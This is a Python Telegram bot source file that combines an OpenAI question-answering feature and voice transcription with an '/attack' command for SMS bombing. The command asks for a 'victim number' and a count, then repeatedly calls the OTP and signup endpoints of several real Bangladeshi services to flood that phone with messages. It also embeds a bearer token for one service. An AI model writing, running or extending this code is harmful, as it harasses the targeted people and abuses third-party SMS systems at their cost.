import telebot
import openai
import requests
from requests.structures import CaseInsensitiveDict
import whisper
import speech_recognition as sr
from pydub import AudioSegment
import pandas as pd




bot = telebot.TeleBot("")
openai.api_key = ""

def ogg2wav(ofn):
    wfn = ofn.replace('.ogg','.wav')
    x = AudioSegment.from_file(ofn)
    x.export(wfn, format='wav') 

# Handle '/start' and '/help'
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "/ai to ask me question. /attack to sms boombing.")

@bot.message_handler(commands=['sheet'])
def send_sheet(message):
    sheet_id = '11d-z-3mLi8Wrh6mROmLLGjUr9Nl1u4O-yEHNCfCciVc'
    sheet_name = "status"
    url = "https://docs.google.com/spreadsheets/d/{}/gviz/tq?tqx=out:csv&sheet={}".format(sheet_id, sheet_name)         
    df = pd.read_csv(url)
    bot.reply_to(message, df)

@bot.message_handler(commands=['gpt'])
def drive_link(message):
    text = "Say something.."
    sent_msg = bot.send_message(message.chat.id, text, parse_mode="Markdown")
    bot.register_next_step_handler(sent_msg, voice_processing)

def voice_processing(message):
    recognizer = sr.Recognizer()
    try:
        file_info = bot.get_file(message.voice.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open('audiofile.ogg', 'wb') as new_file:
            new_file.write(downloaded_file)
        ogg2wav("audiofile.ogg")
        audio_ex = sr.AudioFile("audiofile.wav")
        with audio_ex as source:
            audiodata = recognizer.record(audio_ex)
        final_text = recognizer.recognize_google(audio_data=audiodata, language='en-US')
        response = openai.Completion.create(
            model = "text-davinci-003",
            prompt = final_text,
            temperature=0.3,
            max_tokens=1000,
            top_p=1,
            frequency_penalty=0,
            presence_penalty=0,
        )
        bot.reply_to(message, final_text+"\n"+response['choices'][0]['text'])
    except Exception as e:
        bot.reply_to(message, e)

    downloaded_file = bot.download_file(file_info.file_path)
    # with open('new_file.ogg', 'wb') as new_file:
    #     new_file.write(downloaded_file)
    # model = whisper.load_model("base")
    # result = model.transcribe("new_file.ogg", fp16=False)
    # final_text = result['text']
    # bot.reply_to(message, final_text)

@bot.message_handler(commands=['attack'])
def sign_handler(message):
    text = "Send me victim number."
    sent_msg = bot.send_message(message.chat.id, text, parse_mode="Markdown")
    bot.register_next_step_handler(sent_msg, number_handler)

def number_handler(message):
    number = message.text
    number = number.replace(" ", "")
    try:
        if number == "01736506590" or number == "01609443188" or number == "01720554659" or number == "01729318001":
            bot.send_message(message.chat.id, "Fuck You")
        else:
            text = "Amount of message you want to send."
            sent_msg = bot.send_message(message.chat.id, text, parse_mode="Markdown")
            bot.register_next_step_handler(sent_msg, smsboom_handler, number)
    except:
        print("Something error!")

def smsboom_handler(message, number):
    try:
        amount = int(message.text)
    except:
        amount = 0
        print("Something error!")
    
    count = 1

    print("Number: "+ number)
    print("Amount: "+ str(amount))
    

    while count<int(amount):
    # first
        url = "https://api.bdtickets.com:20100/v1/auth"

        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/json"
        headers["user_agent"] = "Mozilla/5.0 (Linux; Android 11; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"

        data = '{"phoneNumber":"+88'+number+'","createUserCheck":true}'

        resp = requests.post(url, headers=headers, data=data)

        if(resp.status_code==200):
            count+=1
            print("BDTickets "+str(count))
            if count==amount:
                break
        bot.send_message(message.chat.id, str(count), parse_mode="Markdown")

    #second
        url = "https://api.shikho.com/auth/v2/send/sms"

        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/json"

        data = '{"phone":"'+number+'","type":"student","auth_type":"signup","vendor":"shikho"}'


        resp = requests.post(url, headers=headers, data=data)

        if(resp.status_code==200):
            count+=1
            print("Shikho "+str(count))
            if count==amount:
                break
        bot.send_message(message.chat.id, str(count), parse_mode="Markdown")
    #third
        headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.5",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNjc0Mjc5NDA0LCJleHAiOjE2NzQ0NTIyMDR9.lIhaAMxogIf6EwoXdYY5zgL1hEDkbvFgRheuofm8Efw",
        "Connection": "keep-alive",
        "Device-Type": "web",
        "Connection": "keep-alive",
        "Host": "web-api.binge.buzz",
        "Origin": "https://binge.buzz",
        "Referer": "https://binge.buzz/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Sec-GPC": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
        }
  
        r = requests.get(url = "https://web-api.binge.buzz/api/v3/otp/send/+88"+number, headers=headers)
        if(r.status_code==200):
            count+=1
            print("BingeBuzz "+str(count))
            if count==amount:
                break
        
        bot.send_message(message.chat.id, str(count), parse_mode="Markdown")
                
    # six
        headers2 = {
            "Accept":"application/json, text/plain, */*",
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36',
        }
    
        r = requests.get(url = "https://www.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp", headers=headers2)

        if(r.status_code==200):
            count+=1
            print("Bioscope "+str(count))
            if count==amount:
                break

        bot.send_message(message.chat.id, str(count), parse_mode="Markdown")

        
    # fourth
        r = requests.post("http://nesco.sslwireless.com/api/v1/login?phone_number="+number, headers=headers2)
        if(r.status_code==200):
            count+=1
            print("NESCO "+str(count))
            if count==amount:
                break
        
        bot.send_message(message.chat.id, str(count), parse_mode="Markdown")


    #fifth
        headers = {
            "Accept":"application/json, text/plain, */*",
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36',
        }
    
        r = requests.get(url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number, headers=headers)

        if(r.status_code==200):
            count+=1
            print("Bikroy "+str(count))
            if count==amount:
                break
        bot.send_message(message.chat.id, str(count), parse_mode="Markdown")
    bot.send_message(message.chat.id, str(amount)+" message sent successfully.")
            

@bot.message_handler(commands=['ai'])
def ai_handler(message):
    text = "Yes?"
    sent_msg = bot.send_message(message.chat.id, text, parse_mode="Markdown")
    bot.register_next_step_handler(sent_msg, echo_message)

# Handle all other messages with content_type 'text' (content_types defaults to ['text'])
# @bot.message_handler(func=lambda message: True)
def echo_message(message):
    # print(message)
    try:
        response = openai.Completion.create(
            model = "text-davinci-003",
            prompt = message.text,
            temperature=0.3,
            max_tokens=1000,
            top_p=1,
            frequency_penalty=0,
            presence_penalty=0,
        )
    except Exception as e:
        print(e)

    bot.reply_to(message, response['choices'][0]['text'])

bot.polling()
